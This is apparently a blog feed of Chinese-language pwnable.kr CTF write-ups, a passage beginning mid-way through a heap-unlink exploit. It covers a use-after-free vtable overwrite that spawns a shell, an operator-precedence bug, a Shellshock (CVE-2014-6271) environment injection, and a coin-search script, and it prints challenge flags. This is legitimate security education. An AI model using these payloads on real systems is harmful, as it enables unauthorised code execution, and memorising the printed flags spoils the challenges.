class="string">'4444'</span></div><div class="line">payload += pack(stack - <span class="number">0x20</span>)   <span class="comment"># eax. (address of old ebp of unlink) -4</span></div><div class="line">payload += pack(heap + <span class="number">16</span>)  <span class="comment"># edx.</span></div><div class="line">r.sendline( payload )</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-unlink&quot;&gt;&lt;a href=&quot;#0x00-unlink&quot; class=&quot;headerlink&quot; title=&quot;0x00 unlink&quot;&gt;&lt;/a&gt;0x00 unlink&lt;/h2&gt;&lt;p&gt;unlink是堆溢出的常用思路，free一个堆时。有可能会调用unlink函数来拆卸freelist上堆块完成堆块的合并。如果能控制堆的控制区就有可能造成DWSHOOT（有限的任意地址写入）。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>uaf Writeup[pwnable.kr]</title>
    <link href="http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/"/>
    <id>http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/</id>
    <published>2017-02-15T14:20:26.000Z</published>
    <updated>2017-03-10T04:55:09.181Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-UAF"><a href="#0x00-UAF" class="headerlink" title="0x00 UAF"></a>0x00 UAF</h2><p>UAF(Use After Free)释放后重用，其实是一种指针未置空造成的漏洞。在操作系统中，为了加快程序运行速度，如果释放一块n字节大小的内存空间，当申请一块同样大小的内存空间时，会将刚刚释放的内存空间重新分配。如果指向这块内存空间的指针没有置空，会造成一系列的问题。</p>
<a id="more"></a>
<h2 id="0x01-fastbin"><a href="#0x01-fastbin" class="headerlink" title="0x01 fastbin"></a>0x01 fastbin</h2><p>fastbin顾名思义，fast就是要快。所以fastbin旨在加快操作系统的内存分配速度，fastbin仅使用fd形成单链表的形式，且遵循LIFO原则。</p>
<p>当操作系统分配一块较小的内存时(64字节)，会首先从从fastbin中寻找未使用的chunk并分配。</p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">class</span> Human&#123;</div><div class="line"><span class="keyword">private</span>:</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</div><div class="line">        system(<span class="string">"/bin/sh"</span>);</div><div class="line">    &#125;</div><div class="line"><span class="keyword">protected</span>:</div><div class="line">    <span class="keyword">int</span> age;</div><div class="line">    <span class="built_in">string</span> name;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">class</span> Man: <span class="keyword">public</span> Human&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</div><div class="line">            <span class="keyword">this</span>-&gt;name = name;</div><div class="line">            <span class="keyword">this</span>-&gt;age = age;</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</div><div class="line">        Human::introduce();</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">class</span> Woman: <span class="keyword">public</span> Human&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</div><div class="line">            <span class="keyword">this</span>-&gt;name = name;</div><div class="line">            <span class="keyword">this</span>-&gt;age = age;</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</div><div class="line">            Human::introduce();</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</div><div class="line">    Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</div><div class="line"></div><div class="line">    <span class="keyword">size_t</span> len;</div><div class="line">    <span class="keyword">char</span>* data;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</div><div class="line">        <span class="built_in">cin</span> &gt;&gt; op;</div><div class="line"></div><div class="line">        <span class="keyword">switch</span>(op)&#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                m-&gt;introduce();</div><div class="line">                w-&gt;introduce();</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                len = atoi(argv[<span class="number">1</span>]);</div><div class="line">                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</div><div class="line">                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</div><div class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">                <span class="keyword">delete</span> m;</div><div class="line">                <span class="keyword">delete</span> w;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过分析题目源代码，看到各个操作的含义</p>
<ol>
<li>调用</li>
<li>分配内存</li>
<li>释放内存</li>
</ol>
<p>大概的思路是通过3先释放内存，因为程序释放内存后没有将指针置空。故在重新分配时会出现UAF。</p>
<h2 id="0x03-Solution"><a href="#0x03-Solution" class="headerlink" title="0x03 Solution"></a>0x03 Solution</h2><p>这个题目涉及C++程序的逆向，我们可以</p>
<p>看一下C++中的继承是怎么体现的，以Man为例<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">void</span> __fastcall Man::Man(Man *<span class="keyword">const</span> <span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">string</span> name, <span class="keyword">int</span> age)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST0C_4@1</span></div><div class="line"></div><div class="line">  v3 = age;</div><div class="line">  Human::Human(&amp;<span class="keyword">this</span>-&gt;baseclass_0);</div><div class="line">  <span class="keyword">this</span>-&gt;baseclass_0._vptr.Human = (<span class="keyword">int</span> (**)(...))&amp;off_4015B0;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;<span class="keyword">this</span>-&gt;baseclass_0.name, name._M_dataplus._M_p);</div><div class="line">  <span class="keyword">this</span>-&gt;baseclass_0.age = v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>先new了一个Human的类，在修改这个类的虚表(vptr)为Man类的虚表，最后给类的成员变量赋值。</p>
<p>可以看到这个对象m所占的内存空间为<code>8(vptr) + 8(int[age]) + 8(ptr[name]) = 24</code>字节。知道了m对象所占的内存空间，下面需要观察内存空间的布局。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ x/3gx m</div><div class="line">0x603040:   0x0000000000401610  0x0000000000000019</div><div class="line">0x603050:   0x0000000000603028</div><div class="line">gdb-peda$ x/3gx 0x0000000000401610</div><div class="line">0x401610 &lt;_ZTV3Man+16&gt;: 0x000000000040127e  0x00000000004013d8</div><div class="line">0x401620 &lt;_ZTV5Human&gt;:  0x0000000000000000</div><div class="line">gdb-peda$ x/s 0x0000000000603028</div><div class="line">0x603028:   <span class="string">"Jack"</span></div></pre></td></tr></table></figure>
<p>m对象内存布局的示意图</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">+----------------+</div><div class="line">|     vtable     |&lt;--------------------+</div><div class="line">+----------------+                     |</div><div class="line">|     age        |                     |</div><div class="line">+----------------+                     |</div><div class="line">|     ptr name   |                     |</div><div class="line">+----------------+                     | </div><div class="line">        ^                              |</div><div class="line">        |                     +-----------------+</div><div class="line">+----------------+            | humen::getshell |</div><div class="line">|     <span class="string">"Jack"</span>     |            +-----------------+</div><div class="line">+----------------+            | men::introduce  |</div><div class="line">                              +-----------------+</div></pre></td></tr></table></figure>
<p>在看一下在C++中，程序是如何调用虚函数的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> ( op == <span class="number">1</span> )</div><div class="line">&#123;</div><div class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD, _QWORD))m-&gt;_vptr.Human + <span class="number">1</span>))(m);</div><div class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))w-&gt;_vptr.Human + <span class="number">1</span>))(w);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>对应的C++代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">m-&gt;introduce();</div><div class="line">w-&gt;introduce();</div></pre></td></tr></table></figure>
<p>可以看出是通过虚表的index来完成函数调用，所以要调用getshell函数需要把虚表指针的<code>base - 8</code>。</p>
<p>看对方服务器上虚表的地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ x/3gx 0x11caca0</div><div class="line">0x11caca0:  0x0000000000401550  0x0000000000000015</div><div class="line">0x11cacb0:  0x00000000011cac88</div><div class="line">gdb-peda$ x/3gx 0x0000000000401550</div><div class="line">0x401550 &lt;_ZTV5Woman+16&gt;:   0x000000000040117a  0x0000000000401376</div><div class="line">0x401560 &lt;_ZTV3Man&gt;:    0x0000000000000000</div></pre></td></tr></table></figure>
<p>可以看到，需要覆盖的虚表指针为<code>0x401550 - 0x8 = 0x401548</code>。只要将m对象的虚表指针覆盖为<code>0x401548</code>，再通过<code>m -&gt; introduce()</code>即可完成invoke shell。通过UAF可以完成m对象指向的内存空间的修改。</p>
<p>但是，释放内存空间的过程是先释放m再释放w。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">delete</span> m;</div><div class="line"><span class="keyword">delete</span> w;</div></pre></td></tr></table></figure>
<p>通过一次UAF只能修改w指向的内存空间，而在引用的时候却先引用了m指向的内存空间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">m-&gt;introduce();</div><div class="line">w-&gt;introduce();</div></pre></td></tr></table></figure>
<p>这是m指向的内存空间已经被释放，会造成段错误。</p>
<p>因为这块内存空间仅为24字节，所以属于fastbin。根据前面的知识，fastbin是一个LIFO的结构。所以我们只需要分配两次24字节的内存空间，第二次就会分配到之前被释放的m所指向的内存空间。所以需要运行两次分配空间的过程。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">uaf@ubuntu:/tmp$ python -c <span class="string">"print '\x48\x15\x40\x00\x00\x00\x00\x00'+'\x00'*16"</span> &gt; expuaf</div><div class="line">uaf@ubuntu:/tmp$ <span class="built_in">cd</span> </div><div class="line">uaf@ubuntu:~$ ./uaf 24 /tmp/expuaf</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">3</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">2</div><div class="line">your data is allocated</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">2</div><div class="line">your data is allocated</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">1</div><div class="line">$ ls</div><div class="line">flag  uaf  uaf.cpp</div><div class="line">$ cat flag</div><div class="line">yay_f1ag_aft3r_pwning</div><div class="line">$</div></pre></td></tr></table></figure>
<p>后话：<br>因为堆是8字节对齐的，只要重新分配的内存在9-24字节之间就可以分配到之前释放的m和w。所以，程序第一个参数为9-24都可以，不过没有测试。有兴趣的朋友可以测试一下。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-UAF&quot;&gt;&lt;a href=&quot;#0x00-UAF&quot; class=&quot;headerlink&quot; title=&quot;0x00 UAF&quot;&gt;&lt;/a&gt;0x00 UAF&lt;/h2&gt;&lt;p&gt;UAF(Use After Free)释放后重用，其实是一种指针未置空造成的漏洞。在操作系统中，为了加快程序运行速度，如果释放一块n字节大小的内存空间，当申请一块同样大小的内存空间时，会将刚刚释放的内存空间重新分配。如果指向这块内存空间的指针没有置空，会造成一系列的问题。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
      <category term="UAF" scheme="http://weaponx.site/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>一些pwn题目的解题思路[pwnable.kr] II</title>
    <link href="http://weaponx.site/2017/02/14/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr-II/"/>
    <id>http://weaponx.site/2017/02/14/一些pwn题目的解题思路-pwnable-kr-II/</id>
    <published>2017-02-14T17:30:58.000Z</published>
    <updated>2017-02-14T17:46:50.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>以下是solution的目录</p>
<ul>
<li><a href="#mistake" title="mistake">#mistake</a></li>
<li><a href="#shellshock" title="shellshock">#shellshock</a></li>
<li><a href="#coin1" title="coin1">#coin1</a></li>
<li><a href="#blackjack" title="blackjack">#blackjack</a></li>
<li><a href="#lotto" title="lotto">#lotto</a></li>
<li><a href="#cmd1" title="cmd1">#cmd1</a></li>
</ul>
<p>Other</p>
<p><a href="http://weaponx.site/2017/02/13/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr/" title="一些pwn题目的解题思路[pwnable.kr]">一些pwn题目的解题思路[pwnable.kr]</a></p>
<a id="more"></a>
<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</div><div class="line">        s[i] ^= XORKEY;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> fd;</div><div class="line">    <span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</div><div class="line">    sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</div><div class="line"></div><div class="line">    <span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</div><div class="line">    <span class="keyword">int</span> len;</div><div class="line">    <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</div><div class="line">        close(fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;       </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"input password : "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</div><div class="line"></div><div class="line">    <span class="comment">// xor your input</span></div><div class="line">    xor(pw_buf2, <span class="number">10</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</div><div class="line">        system(<span class="string">"/bin/cat flag\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    close(fd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>题目的hint说符号的优先级：</p>
<blockquote>
<p>We all make mistakes, let’s move on.<br>(don’t take this too seriously, no fancy hacking skill is required at all)</p>
<p>This task is based on real event<br>Thanks to dhmonkey</p>
<p>hint : operator priority</p>
</blockquote>
<p>注意到这里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因为<strong>=</strong>的优先级小于<strong>&lt;</strong>，所以<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span></div></pre></td></tr></table></figure></p>
<p>的执行顺序应该是这样的<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">fd = (open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)</div></pre></td></tr></table></figure></p>
<p>然而<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span></div></pre></td></tr></table></figure></p>
<p>为假，所以<figure class="highlight plain"><figcaption><span>= 0```为标准输入，剩下的流程就很简单了。</span></figcaption><table><tr><td class="code"><pre><div class="line"></div><div class="line">```bash</div><div class="line">mistake@ubuntu:~$ ./mistake </div><div class="line">do not bruteforce...</div><div class="line">0000000000</div><div class="line">input password : 1111111111</div><div class="line">Password OK</div><div class="line">Mommy, the operator priority always confuses me :(</div></pre></td></tr></table></figure></p>
<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    setresuid(getegid(), getegid(), getegid());</div><div class="line">    setresgid(getegid(), getegid(), getegid());</div><div class="line">    system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>题目提示破壳漏洞，直接测试一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">shellshock@ubuntu:~$ env foo=<span class="string">'() &#123; :;&#125;; echo vul'</span> ./bash -c <span class="string">'echo yes'</span></div><div class="line">vul</div><div class="line">yes</div></pre></td></tr></table></figure>
<p>存在漏洞，直接丢来exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">shellshock@ubuntu:~$ env foo=<span class="string">'() &#123; :;&#125;; /bin/cat flag'</span> ./shellshock</div><div class="line">only <span class="keyword">if</span> I knew CVE-2014-6271 ten years ago..!!</div><div class="line">Segmentation fault</div></pre></td></tr></table></figure>
<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>一个小游戏，查找一堆硬币中假的那个，30s内要完成100次。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">---------------------------------------------------</div><div class="line">-              Shall we play a game?              -</div><div class="line">---------------------------------------------------</div><div class="line"></div><div class="line">You have given some gold coins <span class="keyword">in</span> your hand</div><div class="line">however, there is one counterfeit coin among them</div><div class="line">counterfeit coin looks exactly same as real coin</div><div class="line">however, its weight is different from real one</div><div class="line">real coin weighs 10, counterfeit coin weighes 9</div><div class="line"><span class="built_in">help</span> me to find the counterfeit coin with a scale</div><div class="line"><span class="keyword">if</span> you find 100 counterfeit coins, you will get reward :)</div><div class="line">FYI, you have 30 seconds.</div><div class="line"></div><div class="line">- How to play - </div><div class="line">1. you get a number of coins (N) and number of chances (C)</div><div class="line">2. <span class="keyword">then</span> you specify a <span class="built_in">set</span> of index numbers of coins to be weighed</div><div class="line">3. you get the weight information</div><div class="line">4. 2~3 repeats C time, <span class="keyword">then</span> you give the answer</div><div class="line"></div><div class="line">- Example -</div><div class="line">[Server] N=4 C=2    <span class="comment"># find counterfeit among 4 coins with 2 trial</span></div><div class="line">[Client] 0 1        <span class="comment"># weigh first and second coin</span></div><div class="line">[Server] 20         <span class="comment"># scale result : 20</span></div><div class="line">[Client] 3          <span class="comment"># weigh fourth coin</span></div><div class="line">[Server] 10         <span class="comment"># scale result : 10</span></div><div class="line">[Client] 2          <span class="comment"># counterfeit coin is third!</span></div><div class="line">[Server] Correct!</div><div class="line"></div><div class="line">- Ready? starting <span class="keyword">in</span> 3 sec... -</div></pre></td></tr></table></figure></p>
<p>其实就是一个二分查找，然而因为网络原因跑30次就超时了，于是丢到对方服务器上跑。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> re, sys</div><div class="line"></div><div class="line">io = remote(<span class="string">"127.0.0.1"</span>, <span class="number">9007</span>)</div><div class="line">io.recv()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_coin_chance</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        ret = io.recv()</div><div class="line">        pattern = re.compile(<span class="string">"N=(\d+)\sC=(\d+)"</span>)</div><div class="line">        res = pattern.search(ret).groups()</div><div class="line">        log.success(<span class="string">"N=[%d], C=[%d]"</span> % (int(res[<span class="number">0</span>]), int(res[<span class="number">1</span>])))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        log.success(<span class="string">"Flag =&gt; [%s]"</span> % ret)</div><div class="line">    <span class="keyword">return</span> int(res[<span class="number">0</span>]), int(res[<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">have_fake</span><span class="params">(nums)</span>:</span></div><div class="line">    ret = int(io.recv())</div><div class="line">    log.success(<span class="string">"Num =&gt; [%d] Weight =&gt; [%d]"</span> % (nums, ret))</div><div class="line">    <span class="keyword">if</span> ret % <span class="number">10</span> == <span class="number">0</span> <span class="keyword">and</span> ret/<span class="number">10</span> == nums:</div><div class="line">        log.info(<span class="string">"No Error find next"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        log.warning(<span class="string">"Find Error"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_coin</span><span class="params">(base, top)</span>:</span></div><div class="line">    c = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(base, top+<span class="number">1</span>):</div><div class="line">        c += (str(x - <span class="number">1</span>) + <span class="string">" "</span>)</div><div class="line">    log.info(<span class="string">"Send Coins =&gt; [%s]"</span> % c.strip())</div><div class="line">    io.sendline(c.strip())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(low, high, chance)</span>:</span></div><div class="line"></div><div class="line">    mid = (high + low) / <span class="number">2</span></div><div class="line">    nums = mid - low + <span class="number">1</span></div><div class="line">    send_coin(low, mid)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> chance == <span class="number">0</span>:</div><div class="line">        <span class="keyword">print</span> io.recv()</div><div class="line">        <span class="keyword">return</span></div><div class="line">        <span class="comment">#coins, chance = get_coin_chance()</span></div><div class="line">        <span class="comment">#check(1, coins, chance)</span></div><div class="line"></div><div class="line"></div><div class="line">    log.warning(<span class="string">"low=&gt;[%d] mid=&gt;[%d] high=&gt;[%d]"</span>%(low,mid,high))</div><div class="line">    <span class="keyword">if</span> have_fake(nums):</div><div class="line">        check(low, mid, chance<span class="number">-1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        check(mid+<span class="number">1</span>, high, chance<span class="number">-1</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        coins, chance = get_coin_chance()</div><div class="line">        check(<span class="number">1</span>, coins, chance)</div></pre></td></tr></table></figure>
<p>跑出来的结果如下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[+] Num =&gt; [1] Weight =&gt; [9]</div><div class="line">[!] Find Error</div><div class="line">[*] Send Coins =&gt; [402]</div><div class="line">Correct! (99)</div><div class="line"></div><div class="line">[+] Flag =&gt; [Congrats! get your flag</div><div class="line">    b1NaRy_S34rch1nG_1s_3asy_p3asy</div><div class="line">    ]</div></pre></td></tr></table></figure>
<h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><p>这个游戏是个21点的游戏，初始给你$500，赢到$1000000就给出flag。但是，这种想直接玩下去估计得明年了。</p>
<p>不过题目中给了源代码的连接，<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="external">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p>
<p>只能从源代码中找漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></div><div class="line">&#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</div><div class="line"> <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</div><div class="line"></div><div class="line"> <span class="keyword">if</span> (bet &gt; cash) <span class="comment">//If player tries to bet more money than player has</span></div><div class="line"> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\nYou cannot bet more money than you have."</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</div><div class="line">        <span class="keyword">return</span> bet;</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">else</span> <span class="keyword">return</span> bet;</div><div class="line">&#125; <span 